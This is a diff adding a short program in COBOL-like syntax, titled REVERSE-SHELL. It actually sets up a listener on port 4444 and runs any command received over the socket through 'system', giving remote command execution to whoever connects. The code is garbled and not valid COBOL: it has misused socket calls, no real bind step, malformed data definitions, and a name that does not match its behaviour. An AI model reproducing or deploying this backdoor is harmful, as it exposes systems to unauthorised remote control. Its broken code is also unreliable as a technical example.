@@ -1,0 +1,91 @@
+IDENTIFICATION DIVISION.
+PROGRAM-ID. REVERSE-SHELL.
+
+ENVIRONMENT DIVISION.
+INPUT-OUTPUT SECTION.
+FILE-CONTROL.
+
+DATA DIVISION.
+FILE SECTION.
+
+WORKING-STORAGE SECTION.
+01 socket PIC S9(9) COMP.
+01 address PIC X(4).
+88 address-len VALUE 4.
+01 port PIC S9(4) COMP.
+01 protocol PIC 9 COMP.
+01 backlog PIC S9(4) COMP.
+01 buffer PIC X(1024).
+01 command PIC X(1024).
+01 execution-status PIC S9(9) COMP.
+
+PROCEDURE DIVISION.
+
+-- Create the socket.
+create-socket:
+    display "Creating socket..."
+    invoke "socket" using by value socket, by value protocol, returning execution-status
+    if execution-status < 0 
+        display "ERROR: UNABLE TO CREATE SOCKET."
+        stop run
+    end-if.
+
+-- Set up the socket address structure.
+set-socket-address:
+    move "0.0.0.0" to address
+    move 4444 to port
+    move 2 to protocol
+    display "Binding socket..."
+    invoke "setsockopt" using by value socket, 1, 2, by value address, address-len returning execution-status
+    if execution-status < 0 
+        display "ERROR: UNABLE TO BIND SOCKET."
+        stop run
+    end-if.
+
+-- Listen for connections.
+listen-for-connections:
+    display "Listening on port 4444..."
+    invoke "listen" using by value socket, backlog returning execution-status
+    if execution-status < 0 
+        display "ERROR: UNABLE TO LISTEN ON SOCKET."
+        stop run
+    end-if.
+
+-- Wait for a connection.
+accept-connection:
+    display "Waiting for connection..."
+    invoke "accept" using by value socket, by reference buffer, by value 1024 returning execution-status
+    if execution-status < 0 
+        display "ERROR: UNABLE TO ACCEPT CONNECTION."
+        stop run
+    end-if.
+    display "Connection received."
+
+-- Execute the command.
+execute-command:
+    move buffer to command
+    display "Executing command: " command
+    invoke "system" using by value command returning execution-status
+    if execution-status < 0 
+        display "ERROR: UNABLE TO EXECUTE COMMAND."
+        stop run
+    end-if.
+
+-- Close the socket.
+close-socket:
+    display "Closing socket..."
+    invoke "close" using by value socket returning execution-status
+    if execution-status < 0 
+        display "ERROR: UNABLE TO CLOSE SOCKET."
+        stop run
+    end-if.
+
+-- Main program.
+main-program:
+    perform create-socket
+    perform set-socket-address
+    perform listen-for-connections
+    perform accept-connection
+    perform execute-command
+    perform close-socket
+    stop run.
